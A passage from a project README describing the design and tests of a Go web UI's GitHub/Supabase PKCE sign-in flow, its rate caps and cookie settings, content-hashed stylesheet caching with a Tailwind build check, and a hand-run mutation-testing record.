- **Why not the cookie alone.** Carrying the verifier in the browser's own `HttpOnly` cookie
  needs no table at all, and it was refused on ONE property: single use. A cookie is deleted by
  *asking* the browser to delete it, so a client that declines cannot be made to; a map entry
  MARKED consumed by the server cannot be presented twice whatever the client does. ⚠ This bullet
  said "a map entry **removed** on read", which was the mechanism for exactly one commit: deleting
  freed the caller's rate slot at the start of the token exchange. The argument never rested on
  the delete — it rests on the decision being the server's.
- **Why there are TWO caps, and why one is not enough.** `POST /sign-in/github` is reachable by
  anybody who can open a socket, and every request writes a record that lives five minutes.
  Without `maxOpenFlights` the route is a memory-exhaustion endpoint. But a **global cap alone
  is a denial of service with extra steps**: one anonymous caller reaches 1024 on its own,
  refreshed every five minutes, and everybody else's button then refuses until the oldest
  expire. `maxFlightsPerClient` is what stops one caller spending everybody else's share —
  `netid`'s own comment makes the same ruling about a limiter with one bucket. Because a spent
  record holds its slot until expiry, **both** numbers bound a RATE: `maxOpenFlights` bounds total
  sign-in starts across all clients per `FlightTTL`, and `maxFlightsPerClient` bounds one
  caller's.
  ⚠ The residual cost: callers behind a shared egress address share a client identity, so a busy
  office reaches 8 between them. That delays a GitHub sign-in and never a credential one — the
  token form touches this table not at all.
- **The existing sign-in lockout covers this door, and `RecordFailure` deliberately does not.**
  `handleOAuthStart` consults `netid.RateLimiter.LockedOut` (its absence was a real hole: a
  client locked out for five failed credential attempts could still drive the start row without
  limit). It does **not** record a failure, because that bucket is shared with `POST /sign-in` at
  5 per window — so counting a *started* sign-in there would mean five clicks of this button lock
  the caller out of the **credential form** for fifteen minutes, behind a refusal that explains
  nothing. Starting a sign-in is not a failing one; the rate of flight creation is bounded by the
  table that holds the flights. `TestALockedOutClientOpensNoFlight` pins both halves, including
  the absence.
- ⚠ **`SameSite=Lax` is load-bearing here, not a convenience.** The callback is a top-level GET
  navigation from the PROVIDER's origin, which is cross-site: `Strict` would withhold the cookie
  and every provider sign-in would be refused.

## 🔴 The callback is the ONE state-changing handler behind a safe method

`stateChanging` calls `GET` safe, so **neither cross-site gate covers the callback** — and it
cannot be a POST, because the provider chooses the method and a redirect is a GET. What covers
it is the flight, as above. The **start** row is a POST for the mirror reason: as a GET it would
be reachable by any `<img src>` in the world and by every link prefetcher, each of which would
mint a flight and overwrite the visitor's flight cookie. So the button is a form, not a link,
and `TestTheStartRowIsRefusedCrossSite` pins that gate (2) covers it and that a refused request
opens **zero** flights.

## Configuration, and the three states a deployment can be in

Everything is in the `CAIRN_SUPABASE_*` namespace. The verifier's settings
(`JWKS_URL`, `ISSUER`, `AUDIENCE`, `PROVIDER`, `REQUIRE_ROLE`, `LEEWAY`, `MAX_AGE`) are read
through `identity.SupabaseBackendFromEnvironment`, which is the **same ledger and the same blank
policy** `cmd/cairn-server` gets — a second reader of that ledger is the duplicated predicate
`internal/identity/config.go`'s whole history is about.

**One** name is read by `cmd/cairn-ui` itself, outside the ledger, and the cost is stated where
it is declared: `CAIRN_SUPABASE_REDIRECT_URL` (required; what arms the button, judged with
`identity.ValueReducesToNothing` rather than a fresh `TrimSpace`).

⚠ **A `CAIRN_SUPABASE_ANON_KEY`/`_FILE` PAIR WAS DRAFTED AND DELETED**, and the record is worth
more than the code was. A **hosted** Supabase project sits behind an API gateway that refuses the
token endpoint without an `apikey` header; this deployment runs GoTrue **self-hosted** behind its
own ingress, has no such gateway, and declined the variable in its own manifest. So the pair
carried a both-set refusal, a file reader, a trailing-newline ruling and two tests for a
deployment shape nobody has — and the `_FILE` spelling would have been the **first secret this
pod mounts**. Re-adding twenty lines if a hosted project ever appears is cheaper than carrying
them; the symptom that would call for it (the exchange answering 401 with everything else
correct) is recorded at `identity.SupabaseOAuth.Exchange`.

🔴 **There is no `CAIRN_SUPABASE_AUTH_URL`.** `/authorize` and `/token` hang off the verifier's
own **issuer**, which for Supabase *is* the GoTrue base URL. Two places to name the project is a
deployment that verifies tokens from one and starts sign-ins at another — every sign-in would
complete at the provider and be refused here, with nothing naming the disagreement.

| state | what it means | what the surface does |
|---|---|---|
| no `CAIRN_SUPABASE_*` | the deployment that existed before this change | credential form only; the two OAuth rows answer **501** |
| the ledger armed, no redirect URL | a bearer JWT authenticates; no browser flow | credential form only; rows answer 501; the startup line says so |
| both, key set fetched | the button is live | both doors |
| both, key set **never fetched** | the provider was unreachable at startup, or is now | credential form only; rows answer **503**; a `WARNING` on stderr; **re-arms by itself** when a fetch succeeds |
| a redirect URL and no verifier | half-configured | **refuses to start**, naming the variable that unblocks it |
| a redirect URL whose path does not end with the callback route | a typo, or a line copied from another app | **refuses to start**, naming both paths |
| a redirect URL that does not parse | a broken template substitution | **refuses to start** |

⚠ **This table listed FOUR rows and stopped at the third state**, with no 503 row and no
path-mismatch row — both of which the same change introduced. The startup line reports which
state it is in, for the reason it already reports whether a share can be recorded: the answer is
decided at startup and discovered at the first click otherwise.

## The stylesheet is TWO routes, and its bytes are BUILD OUTPUT

All three pages link **`/static/app.<12 hex>.css`** — a path carrying a digest of the bytes it
serves — and `handleHashedStylesheet` answers it. The unversioned `/static/app.css` is still a
row, answered by `handleStylesheet`, and **nothing links it**. Both are `classPublic` because
the sign-in page links the hashed one and that page answers anybody — a stylesheet behind the
chain renders the way in as unstyled text. Both serve an **embedded file**, not a directory: an
`http.FileServer` would need a prefix match, which is a second way for a request to reach a
handler and one `TestEveryServedPathComesFromTheLedger` structurally cannot probe.
`TestTheStylesheetIsServedAsItsOwnRoute` pins the RELATIONSHIP rather than either side — it
reads each page's `<link href>` and then fetches that exact href, because two separate
assertions would both pass for a route nobody links or a link nobody serves.

⚠ **THE ROUTE'S ORIGINAL REASON IS GONE AND THE ROUTE IS NOT.** It existed because
`style-src 'self'` forbade an inline `<style>`; that policy was deleted (see *Response
hardening* above), so an inline stylesheet would work again. What keeps the route is the
size: the bytes are generated now, ~29 KB, and inlining them would send that on every
response instead of once per cache lifetime.

### The content-hashed path, and why an unversioned one could not be fixed with a header

🔴 **A CACHE IS KEYED ON THE URL, SO AN UNVERSIONED URL IS AN ENTRY NOTHING CAN INVALIDATE.**
The surface shipped with one stylesheet row at the constant `/static/app.css` and
`Cache-Control: public, max-age=300`, and the short `max-age` was chosen precisely because the
URL carried no version. It was not enough. After an image bump the origin served the current
stylesheet while a returning browser went on applying a much smaller predecessor — one rule for
the sign-in page's classes where the current theme has dozens. The page rendered **unstyled**,
with no error, no missing entry and nothing red anywhere.

🔴 **AND THE HEADER WAS NOT THE LEVER.** The edge in front of the origin answered
`max-age=14400` where the origin asked for `max-age=300` — 48× — so the stale window was hours.
A `Cache-Control` is a *request* to every cache in the path and an intermediary may lengthen it.
That is why the fix is the URL: a URL derived from the bytes is one the browser has never seen
after a theme change, so there is nothing for any cache to serve stale and no cache has to
cooperate.

| piece | where |
|---|---|
| `hashStylesheet` / `hashedStylesheetPathFor` | `stylesheet.go` — SHA-256 of the embedded bytes, hex, first **12** characters |
| `StylesheetHashedPath` | `routes.go`, a **`var`** derived at package init; writing its value down anywhere is the defect coming back under a longer name |
| the two `Cache-Control` values | `server.go` — `public, max-age=31536000, immutable` on the hashed row, `public, max-age=300` on the unversioned one |

🔴 **`immutable` IS LICENSED BY THE URL, NOT BY THE BYTES BEING STABLE.** It tells a cache never
to revalidate for a year, which is only ever true of a URL that cannot come to mean different
bytes. The hashed row has that property by construction; the unversioned row does not and keeps
the short value, which
`TestTheStylesheetRowsCarryTheCacheHeadersTheirURLsLicense` pins in **both** directions as whole
strings — including that the unversioned row's value does not *contain* `immutable`.

🔴 **THE UNVERSIONED ROW IS KEPT, AND THE CONDITION IT IS KEPT UNDER IS THAT NOTHING LINKS IT.**
It costs one ledger row and it means URLs already loose in the world — an HTML page a browser
rendered before the deploy, a bookmark, a link out of a log — answer the current bytes instead
of 404. That argument holds only while the set of such URLs is CLOSED. A page that linked it
would issue every visitor an unversioned URL again and reinstate the whole failure with the
hashed row sitting beside it doing nothing, and it would be silent: every page renders, every
style applies on a cold cache. `TestNoPageLinksTheUnversionedStylesheetPath` is the guard, and
it validates its own detector against a body that must match before reporting a clean verdict.

⚠ **A COMPUTED KEY IS STILL AN EXACT KEY, WHICH IS THE WHOLE REASON THIS WAS ALLOWED.** `routes`
refuses a prefix match — see `routes.go` on why the share flow puts its scope in a query
parameter — because a prefix is a second way to reach a handler and leaves no finite set of
paths to probe. A key computed at init is none of that: the served set is still finite, still
enumerable, still exactly the map's keys, and `TestEveryServedPathComesFromTheLedger` probes
this row's near-misses (`/static/app..css`, a wrong digest, a suffixed digest) and requires 404
from each.

⚠ **WHAT THE LEDGER GUARD STILL CATCHES, AND WHAT IT NO LONGER DOES.**
`TestTheRouteLedgerMatchesTheDispatchTable`'s hand-written list substitutes a digest the *test*
computes from the embedded bytes into the hashed row, because a literal would make every theme
change a failing test with a hand-edit for a remedy. It still fails on a row ADDED, a row
REMOVED, a CLASS changed, a METHOD changed, the two ledger views drifting, and a hashed path
that is not the digest of the served stylesheet. It no longer pins the literal current digest —
which is the property being bought, not a gap. It also cannot see a change made to both the
digest derivation and the test's copy of it in one commit.

### The theme: Tailwind, compiled, checked in

| file | what |
|---|---|
| `internal/ui/tailwind.css` | the SOURCE — `@theme` tokens, the component layer, the reduced-motion block |
| `internal/ui/app.css` | the OUTPUT — generated, checked in, `//go:embed`ed by `stylesheet.go` |
| `nix run .#build-ui-stylesheet` | regenerates the output from the source, in the working tree |
| `checks.ui-stylesheet-is-current` | regenerates in a sandbox and REFUSES a difference |

🔴 **REGENERATE AND DIFF, NEVER HAND-EDIT `app.css`** — the same discipline
`internal/report/testdata/reader_fixtures.json` carries, and for a sharper reason: the file is
embedded, so a stale one is not a weaker comparison, it is *the theme the surface actually
serves*. Nothing about forgetting to regenerate is loud on its own — the build succeeds, every
Go test passes, and the previous stylesheet ships. The check is what makes it loud, and it
validates its own instrument first: a negative control appends a line to the generated bytes
and requires `diff` to report a difference, exiting **2** ("could not vouch") if the control
compares equal.

🔴 **NOTHING IS SCANNED. `tailwind.css` IS THE GENERATOR'S ONLY INPUT, AND THAT IS WHAT MAKES
A RAW UTILITY IN `render.go` A SILENT DEFECT.** The file declares
`@import "tailwindcss" source(none)` and **no `@source` at all**, so the output is a pure
function of those bytes plus the pinned CLI. The structural tell is in the artefact: `app.css`
carries a bare `@layer utilities;` — the layer is declared and **empty**.

🔴 **SO THE RULE THAT BINDS THE NEXT EDIT: EVERY CLASS `render.go` RENDERS IS A SEMANTIC NAME
DEFINED IN `tailwind.css`. NEVER A RAW TAILWIND UTILITY.** Add `h.Class("flex gap-2")` to a new
element and regenerate: `app.css` is **byte-unchanged**, so
`checks.ui-stylesheet-is-current` stays **green** and the element would ship with two class
names the served bytes have no rule for. Give it a named class here instead, composed with
`@apply` like the other ~35.

🔴 **`TestEveryRenderedClassHasARuleInTheStylesheet` IS WHAT MAKES THAT LOUD, AND IF YOU ARE
READING THIS BECAUSE IT WENT RED, IT IS RIGHT AND THE CODE IS WRONG.** Define the class in
`tailwind.css` and regenerate; do not delete the test. **Before it existed,
`go test ./internal/ui/` was green on exactly the defect above** — that is why it exists, and
it is the only thing in the tree that can see it: the currency check compares generated
against committed and a raw utility moves neither. It reads `Class(…)`, `Attr("class", …)` and
`Classes{…}`; a fourth way of emitting a class would be invisible to it, which its own doc
comment states.

⚠ **THIS SECTION USED TO TEACH THE OPPOSITE, AND THE RETRACTION IS THE POINT BECAUSE THIS
README IS THE DOC A NEXT EDITOR READS INSTEAD OF THE SOURCE COMMENTS.** It read *"THE CLASS
NAMES IN `render.go` ARE WHAT THE GENERATOR SCANS, SO EVERY ONE IS A LITERAL. `tailwind.css`
declares `@import "tailwindcss" source(none)` plus `@source "./*.go"`, which pins the scan to
exactly `internal/ui/*.go` … a class assembled at run time (`"text-" + size`) is invisible to
that scan"*, and it closed with *"Utilities are used directly for page layout."* Both were true
of the draft and both are now false: **the `@source` line was deleted**, because Tailwind's
extractor reads COMMENTS as readily as code and this package's comments are dense by house rule
— six utilities were generated out of ordinary English with no class literal anywhere, and a
comment-only edit reddened the currency check with a message blaming a hand-edit that never
happened. The measurement is in `tailwind.css`'s own header. The run-time-assembly hazard the
old text named is now the *whole* hazard rather than an edge of it: with no scan, a **literal**
utility is just as invisible as a computed one.

The semantic class names (`.viewer`, `.signin`, `.replica-honesty`, `.entry`, `.page-header`,
`.page-main`, `.signin-main`, …) are therefore the only kind this surface renders — the page
shell included, which is what the three `.page-*`/`.signin-main` classes are. Two are asserted
by tests here, one is driven by a browser harness outside this repository, and `@apply` in a
component layer is Tailwind's documented answer for exactly that.

🔴 **`prefers-reduced-motion: reduce` REMOVES THE MOTION, IT DOES NOT SHORTEN IT.** The common
snippet sets `animation-duration: 0.01ms`, which still *runs* the animation — a reader who
asked for no motion gets one frame of the same transform. The block sets `animation: none` and
`transition: none`, unlayered and `!important`, so it beats both the component layer and any
utility. It is a global block rather than per-call-site `motion-reduce:` variants for the
reason a spelled guard is weaker than a structural one: a variant is one forgotten class away
from being wrong, at a place where being wrong is an accessibility failure. Every keyframe set
uses `both` fill with a visible `to` state, so removing the animation leaves the element in its
ordinary static rendering rather than invisible at `opacity: 0`.

## The mutation rows — 31 mutants, 31 killed, and the battery is NOT in the tree

🔴 **READ THIS BEFORE THE TABLE: THIS BATTERY IS RUN BY HAND AND IS NOT COMMITTED.** Unlike
`tests/control_mutants.py` — a step in `.github/workflows/ci.yml`, pinned by
`tests/test_control_mutant_count_is_pinned.py` — the rows below were driven by a script in a
scratch directory, one mutant at a time, and nothing in this repository re-runs them. So this
table is a RECORD of a measurement, not a gate, and it is the only place in the tree that
records it: a later reviewer could not verify the count from the tree at all while the table
said 18 and the run was 27.
🔴 **A ROW HERE IS NOT COVERAGE. The guard it names is the coverage; the row is evidence the
guard was watched going red once.** If you change any of this code, the honest move is to
re-derive the relevant rows rather than to trust a table nothing re-runs — and the section above
records why a second committed battery was deleted rather than added.

Each row reverts ONE decision to its pre-change behaviour, or breaks one guard, and names the
test that must go red. A baseline ran first proving all 31 named tests GREEN, so a test that was
already red could not be reported as a kill; a mutant whose build failed was reported as
BUILD-FAIL and never as a kill.

| mutant | test that KILLED it |
|---|---|
| ~~the CSP reverted to the Phase A/B policy~~ — **RETIRED**: the policy it reverted no longer exists, and the test that killed it no longer asserts one. The replacement mutant is *the CSP header is restored*, killed by `TestTheHTMLResponseSendsNoContentSecurityPolicy`. Both rows are kept because a table row that silently changes meaning is worse than one that says it changed | `TestTheHTMLResponseSendsNoContentSecurityPolicy` |
| an undeclared path answers the old uniform 401 | `TestEveryServedPathComesFromTheLedger` |
| the root redirect deleted | `TestTheRootRedirectsABrowserAndRefusesEverythingElse` |
| the root redirect WIDENED to every client (`Accept` ignored) | the same test |
| the entries page inlines its stylesheet again | `TestTheStylesheetIsServedAsItsOwnRoute` |
| the ambient cookie tried before the Supabase header credential | `TestTheUIChainTriesEveryHeaderCREDENTIALBeforeTheAmBIENTCookie` |
| a flight is not consumed on read (replayable sign-in) | `TestAFlightIsSingleUseAndBoundToItsBrowser` |
| the flight table has no GLOBAL size bound | `TestTheFlightTableIsBoundedGloballyAndPerClient` |
| the PER-CLIENT flight bound is removed (one caller spends the whole table) | the same test |
| the start row ignores the sign-in lockout | `TestALockedOutClientOpensNoFlight` |
| a successful flight start RECORDS a failure against the shared sign-in bucket | the same test |
| the same-origin gate always passes | `TestTheStartRowIsRefusedCrossSite` |
| the exchanged token trusted because of the CHANNEL it arrived on | `TestTheExchangeVERIFIESWhatTheProviderReturned` |
| the PKCE challenge is the verifier itself (no S256) | `TestTheGitHubButtonMintsAFlightAndRedirectsToTheProvider` |
| a failed exchange discriminates its reason | `TestAFailedExchangeSaysNothingAboutTheCredentialTable` |
| the provider's `error_description` reflected into the page | `TestTheProviderErrorIsNotReflectedIntoThePage` |
| the credential field renamed, breaking the harness selector | `TestTheCredentialFormSURVIVESTheProviderButton` |
| the credential form rewired to post at the provider route | the same test |
| ~~`frame-ancestors` dropped (the surface becomes frameable)~~ — 🔴 **RETIRED, AND IT IS THE SHARPER OF THE TWO RETIREMENTS BECAUSE THE "MUTANT" IS NOW THE SHIPPED STATE.** The whole policy was deleted by operator decision, so this surface IS frameable — see *Response hardening* above. The row was false twice over: the named killer stopped asserting anything about the policy in the same change, and the state it calls a defect is the accepted one. **There is no replacement mutant**, deliberately: nothing here can kill a mutant whose result is what the tree already does, and inventing a row that sounded like coverage would be worse than saying so. What IS pinned is the deletion itself, by `TestTheHTMLResponseSendsNoContentSecurityPolicy` | *(nothing — see above)* |
| the chain assembled BY HAND in the wrong order — **the control that actually compiles** | `TestTheUIChainTriesEveryHeaderCREDENTIALBeforeTheAmBIENTCookie` |
| a spent flight DELETED again (the cap bounds concurrency, not rate) | `TestOneClientCannotAmplifyRequestsAtTheProvider` |
| the flight cookie loses its `__Host-` prefix | `TestTheFlightCookieCarriesItsPrefixAndFlagsOnTheWire` |
| `FlightTTL` widened to thirty days | `TestTheGitHubButtonMintsAFlightAndRedirectsToTheProvider` |
| the global flight cap **WIDENED** — the direction the old assertion could not see | `TestTheFlightTableIsBoundedGloballyAndPerClient` |
| the callback reads the query BEFORE consuming the flight | `TestTheProviderErrorIsNotReflectedIntoThePage` |
| an unready provider treated as ready | `TestTheProviderDoorIsWITHHELDWhileItsKeySetHasNeverBeenFetched` |
| the served stylesheet emptied (the self-referential comparison) | `TestTheStylesheetIsServedAsItsOwnRoute` |
| the pages link the UNVERSIONED stylesheet path again | `TestNoPageLinksTheUnversionedStylesheetPath`, and three others: `TestTheStylesheetIsServedAsItsOwnRoute`, `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheStylesheetURLChangesWhenTheBytesChange` |
| the digest ignores the bytes it is given (a constant hashed instead) | `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheStylesheetURLChangesWhenTheBytesChange`, `TestTheRouteLedgerMatchesTheDispatchTable`, `TestTheHashedStylesheetPathHasTheShapeItClaims` |
| the hashed row served without `immutable` | `TestTheStylesheetRowsCarryTheCacheHeadersTheirURLsLicense` |
| `StylesheetHashedPath` written down as a literal equal to today's digest — 🔴 **AN EQUIVALENT MUTANT ON THIS TREE AND SAYING SO IS THE POINT.** The two expressions evaluate to the same string *today*, so nothing can distinguish them until `app.css` changes; a table row claiming a kill here would be false. What IS measured: with the mutant applied **and** one byte appended to `app.css`, three guards go red — and the same byte change against unmutated code is green, so the red is the mutant's | `TestTheRouteLedgerMatchesTheDispatchTable`, `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheHashedStylesheetPathHasTheShapeItClaims` — *only once the bytes move* |
| the startup callback-path check disabled | `TestTheProviderFlowDecisionTable` |
| that check made an EQUALITY again (refusing a path-prefixing proxy) | the same test |
| the flight cookie's `Path` no longer exactly `/` — a `__Host-` cookie a browser DROPS | `TestTheFlightCookieCarriesItsPrefixAndFlagsOnTheWire` |
| a consumed flight KEEPS its PKCE verifier in memory | `TestAFlightIsSingleUseAndBoundToItsBrowser` |

🔴 **ONE OF THOSE MUTANTS SURVIVED ITS FIRST RUN, AND THE SURVIVAL WAS A DEFECT IN THE TEST
RATHER THAN IN THE CODE.** The S256 assertion first read
`pkceChallenge(stub.verifiers[0]) == stub.challenges[0]` — both sides of a comparison derived
from the implementation under test. A mutant making `pkceChallenge` return its argument
**verbatim** (PKCE switched off, the verifier travelling in the authorize URL) passed that
spelling, because both sides moved together. The fix computes `base64url(sha256(verifier))`
independently in the test, and adds an assertion that the challenge and the verifier are not the
same string. That is the "never derive a test's expectation from the implementation it tests"
rule, caught by the battery rather than by review.

🔴 **AND A LATER ROUND RAN ITS OWN 21 MUTANTS AND FOUR SURVIVED — TWO OF THEM AGAINST GUARDS THE
ROUND ABOVE HAD JUST WRITTEN.** The survivors were: the startup callback-path check (no test fed
it a wrong path at all), the `__Host-` cookie's `Path` (asserted with
`strings.Contains(header, "Path=/")`, which `Path=/sign-in` satisfies), the "verifier is cleared
on consume" claim, and one magnitude-band mutant that was by design. All four are closed now.
**Read that as a measurement of the battery rather than of the code: a battery you choose is
blind to exactly what you did not think to mutate**, which is why the table above is evidence and
not coverage, and why an independent round is worth more than another row. The four rows at the
end of the table are the ones that close those survivors — they exist because somebody else
looked, not because the battery grew on its own.

## What Phase D's tests still structurally cannot see

- 🔴 **A GUARD THIS SECTION SHOULD HAVE PREDICTED AND DID NOT: the startup path check shipped
  with no test at all.** Mutating its condition to `false` survived all 27 tests in
  `cmd/cairn-ui`, because the only redirect URL any fixture fed it happened to have a matching
  path. A check whose guard is "the fixture happens to satisfy it" is a check nobody holds, and
  the decision table it belongs to says in its own docstring that it is "written out because it
  is a decision and not a derivation" — the new decision was simply not written into it. Every
  row of that table now carries the refusal it expects to see BY NAME, so a row cannot go green
  on the wrong refusal.
- 🔴 **AND THE SAME CHECK REFUSED A LEGITIMATE DEPLOYMENT, WHICH NO TEST COULD HAVE CAUGHT
  BECAUSE NO TEST DESCRIBED IT.** An equality against `ui.OAuthCallbackPath` exits 78 for a
  surface behind a path-prefixing proxy — `…/cairn/sign-in/github/callback` — which started and
  worked before the check existed. The assumption that failed was written one line above it
  ("the path half is this repository's"): a path PREFIX is the deployment's too. It is a suffix
  match now, and the proxy shape is a row in the table. ⚠ **What still cannot be checked here:
  whether the prefix matches the proxy's** — this process cannot know its own external origin,
  which is the same reason the scheme and host are unchecked.
- **No real provider.** Every test here stubs the exchange or stands up a local HTTP handler
  answering as the token endpoint. Nothing measures GoTrue's actual `/authorize` parameter
  handling, its allow-list matching, or whether `flow_type=pkce` behaves as documented on the
  operator's version. The first real sign-in is the measurement.
- **No browser.** `SameSite`, `__Host-`, and whether a browser follows the 303 with the flight
  cookie attached are all claims *about browsers* that no test here drives. The failure
  direction for the cookie prefixes is the safe one (an unsupporting browser treats the name as
  ordinary); the failure direction for `SameSite=Lax` on the callback is **not** — a browser
  that withheld it would refuse every provider sign-in.
- **No concurrency on the flight table.** It is mutex-guarded and the guard is not measured
  under contention.
- **Nothing measures the deployed instance**, which is the gap the retracted bullet at the end
  of Phase C's section now states honestly.
